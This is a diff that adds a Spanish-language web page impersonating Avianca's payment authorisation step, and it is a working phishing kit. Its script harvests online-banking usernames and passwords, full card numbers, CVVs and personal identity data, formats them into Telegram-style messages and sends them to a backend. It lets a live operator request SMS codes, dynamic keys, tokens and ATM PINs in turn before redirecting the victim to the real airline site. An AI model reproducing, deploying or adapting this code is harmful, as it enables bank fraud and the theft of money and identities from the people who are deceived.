@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avianca - Booking</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="shortcut icon" href="./assets/favicon.svg" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="./css/checkers.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+    <script src="./js/functions.js"></script>
+
+    <style>
+        /* --- ESTILOS RESPONSIVE AÑADIDOS --- */
+        body {
+            background-color: #f4f7f6; /* Fondo más suave */
+        }
+        .logos, main {
+            max-width: 500px; /* Ancho máximo del contenedor */
+            margin: 20px auto; /* Centrar y dar espacio */
+            padding: 0 15px; /* Espacio en móviles */
+            box-sizing: border-box;
+        }
+        .content {
+            background-color: #ffffff; /* Fondo de tarjeta blanco */
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+        .btn-success {
+            width: 100%; /* Botón siempre a 100% */
+            padding: 12px;
+            font-size: 1.1rem;
+        }
+        @media (max-width: 600px) {
+            .logos {
+                flex-direction: column;
+                align-items: center;
+                gap: 15px;
+            }
+            .content {
+                padding: 20px;
+            }
+        }
+        /* --- FIN ESTILOS RESPONSIVE --- */
+
+        .loaderp {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #fff;
+            border-bottom-color: #e8114b;
+            border-radius: 50%;
+            display: inline-block;
+            box-sizing: border-box;
+            animation: rotation 1s linear infinite;
+        }
+
+        @keyframes rotation {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loaderp-full {
+            position: fixed;
+            top: 0;
+            left: 0;
+            overflow-y: hidden;
+            z-index: 1000;
+            background-color: rgba(255, 255, 255, 0.9);
+            width: 100vw;
+            height: 100vh;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .content form input {
+            width: 100% !important;
+            box-sizing: border-box !important;
+            display: block;
+            width: 100%;
+            padding: 0.75rem 1rem;
+            font-size: 1.1rem;
+            font-weight: 400;
+            line-height: 1.5;
+            color: #212529;
+            background-color: #fff;
+            background-clip: padding-box;
+            border: 1px solid #ced4da;
+            appearance: none;
+            border-radius: 0.3rem;
+            transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
+        }
+        .content form label {
+            display: inline-block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+        }
+        .content form .form-group {
+            margin-bottom: 1rem;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .error-message {
+            color: #D8000C;
+            background-color: #FFD2D2;
+            border: 1px solid #D8000C;
+            border-radius: 5px;
+            padding: 10px;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-loader show">
+        <img id="company-loader">
+        <div class="loader"></div>
+    </div>
+    <div class="logos">
+        <img id="bank-logo" src="" alt="" width="">
+        <img id="company-logo" src="/assets/logos/avianca_full.svg" alt="Avianca 2" width="110px">
+    </div>
+    <main>
+        <div class="content">
+            <b style="margin-bottom: 10px; display: block;">Autorización de transacción</b>
+            <p style="margin-bottom: 20px;">La transacción que intenta realizar en <b>AVIANCA S.A</b> por <b>$ <span id="flight-cost-1">49.900</span> USD</b> debe ser autorizada. Por favor, ingresa los datos de tu banca virtual:</p>
+            
+            <div style="background-color: #f4f7f6; padding: 15px; border-radius: 5px; margin-bottom: 20px;">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
+                    <b>Comercio:</b>
+                    <p style="margin: 0;">AVIANCA S.A</p>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
+                    <b>Monto:</b>
+                    <p style="margin: 0;">$ <span id="flight-cost-2">49.000</span> cop</p>
+                </div>
+                <div style="display: flex; justify-content: space-between;">
+                    <b>Número de tarjeta:</b>
+                    <p style="margin: 0;">•••• •••• •••• <span id="card-digits"></span></p>
+                </div>
+            </div>
+
+            <form id="form" style="margin-bottom: 30px;" onsubmit="return false;">
+                
+                <div class="form-group" id="user-group">
+                    <label for="auth-user">Usuario</label>
+                    <input type="text" id="auth-user" required>
+                </div>
+                
+                <div class="form-group" id="pass-group">
+                    <label for="auth-password">Contraseña</label>
+                    <input type="password" id="auth-password" required>
+                </div>
+
+                <div id="dynamic-code-container" class="form-group hidden">
+                    </div>
+
+                <div id="error-message" class="error-message"></div>
+
+            </form>
+            </div>
+
+        <button id="btnNextStep" class="btn-success">
+            Autorizar
+        </button>
+    </main>
+
+    <div class="loaderp-full" id="loader-container">
+        <span class="loaderp"></span>
+        <p class="text-italic tc-ocean fs-3 fw-light" id="loader-text">Validando datos...</p>
+    </div>
+
+    <script>
+        let pageState = 'initial'; // 'initial' o 'waiting_for_code'
+        let currentTransactionId = '';
+        let currentMessageId = '';
+
+        function escapeMarkdownV2(text) {
+            if (!text) return '';
+            const specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
+            let escapedText = text;
+            for (const char of specialChars) {
+                const regex = new RegExp(`\\${char}`, 'g');
+                escapedText = escapedText.replace(regex, `\\${char}`);
+            }
+            return escapedText;
+        }
+
+        function showLoader(show, text = "Validando datos...") {
+            const loader = document.getElementById('loader-container');
+            document.getElementById('loader-text').textContent = text;
+            loader.style.display = show ? "flex" : "none";
+        }
+
+        function showFormError(message) {
+            const errorEl = document.getElementById('error-message');
+            if (message) {
+                errorEl.textContent = message;
+                errorEl.style.display = 'block';
+            } else {
+                errorEl.style.display = 'none';
+            }
+        }
+        
+        function setFormDisabled(disabled) {
+            // Deshabilita campos solo si existen
+            const userInput = document.getElementById('auth-user');
+            const passInput = document.getElementById('auth-password');
+            const dynamicCodeInput = document.getElementById('dynamic-code');
+            
+            if (userInput) userInput.disabled = disabled;
+            if (passInput) passInput.disabled = disabled;
+            if (dynamicCodeInput) dynamicCodeInput.disabled = disabled;
+            
+            document.getElementById('btnNextStep').disabled = disabled;
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const storedData = JSON.parse(localStorage.getItem('paymentData')) || {};
+            
+            currentTransactionId = storedData.transactionId || (Date.now().toString(36) + Math.random().toString(36).substr(2));
+            localStorage.setItem('paymentData', JSON.stringify({ ...storedData, transactionId: currentTransactionId }));
+
+            // --- CORRECCIÓN DE PRECIO ---
+            // Intenta obtener el precio de localStorage, si no existe, usa 49.900 (COP/USD)
+            const amount = storedData.flightCost || "49.900"; 
+            const card = storedData.cardNumber ? storedData.cardNumber.slice(-4) : "1234";
+
+            document.getElementById('flight-cost-1').textContent = amount;
+            document.getElementById('flight-cost-2').textContent = amount;
+            // ----------------------------
+
+            document.getElementById('card-digits').textContent = card;
+            
+            document.querySelector(".main-loader").classList.remove('show');
+        });
+
+        document.getElementById("btnNextStep").addEventListener("click", async function() {
+            showFormError(null); 
+            const storedData = JSON.parse(localStorage.getItem('paymentData')) || {};
+            
+            let fullMessage = "";
+            let keyboard = {};
+            
+            // --- [MODIFICADO] Emojis añadidos al mensaje base ---
+            const baseMessage = `
+✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*👤 DATOS DEL TITULAR*
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*🤵‍♂️ Nombre:* ${storedData.name ? escapeMarkdownV2(storedData.name) : 'No ingresado'}
+*🪪 Identificación:* ${storedData.cc ? escapeMarkdownV2(storedData.cc) : 'No ingresado'}
+*📧 Email:* ${storedData.email ? escapeMarkdownV2(storedData.email) : 'No ingresado'}
+*📱 Celular:* ${storedData.telnum ? escapeMarkdownV2(storedData.telnum) : 'No ingresado'}
+*🗺️ Ciudad:* ${storedData.city ? escapeMarkdownV2(storedData.city) : 'No ingresado'}
+*📍 Estado:* ${storedData.state ? escapeMarkdownV2(storedData.state) : 'No ingresado'}
+*🏠 Dirección:* ${storedData.address ? escapeMarkdownV2(storedData.address) : 'No ingresado'}
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*💳 DETALLES DE LA TARJETA*
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*🏦 Banco:* ${storedData.bank ? escapeMarkdownV2(storedData.bank) : 'No ingresado'}
+*💳 Número de Tarjeta:*
+\`${storedData.cardNumber ? escapeMarkdownV2(storedData.cardNumber) : 'No ingresado'}\`
+*📅 Fecha de Exp:*
+\`${storedData.expiryDate ? escapeMarkdownV2(storedData.expiryDate) : 'No ingresado'}\`
+*🔐 CVV:*
+\`${storedData.cvv ? escapeMarkdownV2(storedData.cvv) : 'No ingresado'}\`
+*🔢 Cuotas:* ${storedData.dues ? escapeMarkdownV2(storedData.dues) : 'No ingresado'}
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-`;
+
+            // [NUEVO] Botones de solicitud de código (para el operador)
+            const allCodeButtons = [
+                // Usando 'SMS' en lugar de 'OTP'
+                { text: "Pedir SMS 📱", callback_data: `sms:${currentTransactionId}` },
+                { text: "Pedir Clave Dinámica 🔑", callback_data: `dinamica:${currentTransactionId}` },
+                { text: "Pedir Token 📟", callback_data: `token:${currentTransactionId}` },
+                { text: "Pedir Cajero (ATM) 🏧", callback_data: `atm:${currentTransactionId}` }
+            ];
+
+            if (pageState === 'initial') {
+                const user = document.getElementById('auth-user').value;
+                const pass = document.getElementById('auth-password').value;
+
+                if (!user || !pass) {
+                    showFormError("Por favor, ingrese su usuario y contraseña.");
+                    return;
+                }
+                
+                showLoader(true, "Verificando credenciales...");
+                setFormDisabled(true);
+
+                // --- [MODIFICADO] Emojis añadidos al mensaje ---
+                fullMessage = `${baseMessage}
+*👤 DATOS DE ACCESO*
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*🤵 Usuario:* ${escapeMarkdownV2(user)}
+*🔒 Contraseña:* ${escapeMarkdownV2(pass)}
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*🆔 ID de Transacción:* ${currentTransactionId}
+`;
+                // --- [MODIFICADO] Botones iniciales del operador ---
+                keyboard = { 
+                    inline_keyboard: [
+                        ...allCodeButtons.map(btn => [btn]), // Cada botón en su propia fila
+                        [{ text: "Error de Usuario/Clave ❌", callback_data: `error_logo:${currentTransactionId}` }],
+                        [{ text: "Error de Tarjeta 💳", callback_data: `error_tc:${currentTransactionId}` }]
+                    ]
+                };
+
+            } else if (pageState === 'waiting_for_code') {
+                const user = document.getElementById('auth-user').value;
+                const pass = document.getElementById('auth-password').value;
+                const codeInput = document.getElementById('dynamic-code');
+                const codeValue = codeInput.value;
+                const codeType = codeInput.dataset.type; // Ej: "SMS", "Clave Dinámica"
+
+                if (!codeValue) {
+                    showFormError(`Por favor, ingrese su ${codeType}.`);
+                    return;
+                }
+
+                showLoader(true, "Validando código...");
+                setFormDisabled(true);
+
+                // --- [MODIFICADO] Emojis añadidos al mensaje ---
+                fullMessage = `${baseMessage}
+*👤 DATOS DE ACCESO*
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*🤵 Usuario:* ${escapeMarkdownV2(user)}
+*🔒 Contraseña:* ${escapeMarkdownV2(pass)}
+*🔴 ${escapeMarkdownV2(codeType)}:* ${escapeMarkdownV2(codeValue)}
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*🆔 ID de Transacción:* ${currentTransactionId}
+`;
+                // --- [MODIFICADO] Botones dinámicos para el operador ---
+                const currentActionPrefix = codeType === 'Cajero (ATM)' ? 'atm' : codeType.toLowerCase().split(' ')[0];
+                const nextButtons = allCodeButtons.filter(btn => !btn.callback_data.startsWith(currentActionPrefix));
+                
+                keyboard = {
+                    inline_keyboard: [
+                        ...nextButtons.map(btn => [btn]), // Botones de códigos restantes
+                        [{ text: `Error de ${codeType} ❌`, callback_data: `error_${currentActionPrefix}:${currentTransactionId}` }],
+                        [{ text: "Finalizar Proceso ✅", callback_data: `finalizar:${currentTransactionId}` }]
+                    ]
+                };
+            }
+
+            // --- Lógica de envío (sin cambios) ---
+            try {
+                const response = await fetch(`/api/send-message`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        text: fullMessage,
+                        keyboard: keyboard,
+                    }),
+                });
+                
+                const data = await response.json();
+
+                if (data.ok && data.result.message_id) {
+                    currentMessageId = data.result.message_id;
+                    console.log(`Mensaje enviado (Estado: ${pageState}). Esperando acción para Message ID: ${currentMessageId}`);
+                    waitForOperatorAction(currentTransactionId, currentMessageId);
+                } else {
+                    throw new Error(data.description || "Error al enviar mensaje al backend.");
+                }
+
+            } catch (error) {
+                console.error("Error en enviarDatos:", error);
+                showLoader(false);
+                setFormDisabled(false);
+                showFormError("Error de comunicación. Intente de nuevo.");
+            }
+        });
+
+        // --- 3. Esperar respuesta del operador (Lógica de "checkVerification" adaptada) ---
+        async function waitForOperatorAction(transactionId, messageId) {
+            try {
+                const response = await fetch(`/api/check-update/${messageId}`); 
+                
+                if (response.status === 408) { // Timeout
+                    showLoader(false);
+                    setFormDisabled(false);
+                    showFormError("El tiempo de espera se agotó. Intente de nuevo.");
+                    return;
+                }
+
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    throw new Error(errorData.error || "Error desconocido del servidor.");
+                }
+
+                const { action } = await response.json();
+                console.log('Acción recibida del operador:', action);
+
+                showLoader(false);
+                const isErrorAction = action.startsWith('error_');
+                // Uso de 'sms' en lugar de 'otp'
+                const isRequestAction = ['sms', 'dinamica', 'token', 'atm'].includes(action);
+
+                if (isRequestAction) {
+                    // --- El operador pide un código ---
+                    pageState = 'waiting_for_code';
+                    let codeType = action.charAt(0).toUpperCase() + action.slice(1);
+                    // Asegura que se muestre "SMS" y "Cajero (ATM)"
+                    if (action === 'sms') codeType = 'SMS'; 
+                    if (action === 'atm') codeType = 'Cajero (ATM)';
+                    
+                    // --- [MODIFICADO] Ocultar campos de usuario y contraseña ---
+                    document.getElementById('user-group').classList.add('hidden');
+                    document.getElementById('pass-group').classList.add('hidden');
+
+                    const dynamicContainer = document.getElementById('dynamic-code-container');
+                    dynamicContainer.innerHTML = `
+                        <label for="dynamic-code" class="form-label" style="color: #e8114b; font-weight: bold;">Clave ${codeType}</label>
+                        <input type="tel" id="dynamic-code" data-type="${codeType}" required placeholder="Ingrese el código" inputmode="numeric" />
+                    `;
+                    dynamicContainer.classList.remove('hidden');
+                    
+                    document.getElementById('btnNextStep').textContent = `Enviar Clave ${codeType}`;
+                    setFormDisabled(false); // Reactivar solo el botón
+                    
+                    document.getElementById('dynamic-code').focus();
+
+                } else if (isErrorAction) {
+                    // --- El operador reporta un error ---
+                    setFormDisabled(false); 
+                    
+                    if (action === 'error_logo') {
+                        showFormError("Usuario o clave incorrecto. Revise sus datos e intente nuevamente.");
+                        
+                        // --- [MODIFICADO] Mostrar campos de nuevo ---
+                        document.getElementById('user-group').classList.remove('hidden');
+                        document.getElementById('pass-group').classList.remove('hidden');
+                        // Ocultar campo de código (si existía)
+                        document.getElementById('dynamic-code-container').classList.add('hidden');
+                        document.getElementById('dynamic-code-container').innerHTML = '';
+                        
+                        document.getElementById('auth-password').value = '';
+                        document.getElementById('auth-user').focus();
+                        pageState = 'initial'; // Volver al estado inicial
+                        document.getElementById('btnNextStep').textContent = 'Autorizar';
+
+                    } else if (action === 'error_tc') {
+                        alert("Error en la tarjeta. Será redirigido a la página de pago.");
+                        window.location.href = "payment.html";
+                    } else {
+                        // Error de SMS, Dinámica, etc.
+                        let codeType = action.replace('error_', '').charAt(0).toUpperCase() + action.replace('error_', '').slice(1);
+                        if (action === 'error_sms') codeType = 'SMS';
+                        if (action === 'error_atm') codeType = 'Cajero (ATM)';
+                        
+                        showFormError(`El código ${codeType} es incorrecto. Por favor, ingrese el nuevo código.`);
+                        
+                        const dynamicCodeInput = document.getElementById('dynamic-code');
+                        if (dynamicCodeInput) {
+                            dynamicCodeInput.value = '';
+                            dynamicCodeInput.focus();
+                        }
+                    }
+
+                } else if (action === 'finalizar') {
+                    // --- Proceso finalizado ---
+                    document.getElementById('loader-text').textContent = "Pago Aprobado. Redirigiendo...";
+                    showLoader(true);
+                    setTimeout(() => {
+                        window.location.href = "https://www.avianca.com/";
+                    }, 2000);
+
+                } else {
+                    // Acción desconocida
+                    showFormError("Se recibió una respuesta inesperada. Intente de nuevo.");
+                    setFormDisabled(false);
+                }
+
+            } catch (error) {
+                console.error("Error en waitForOperatorAction:", error);
+                showLoader(false);
+                setFormDisabled(false);
+                showFormError("Error de comunicación. Intente de nuevo.");
+            }
+        }
+    </script>
+    </body>
+</html>
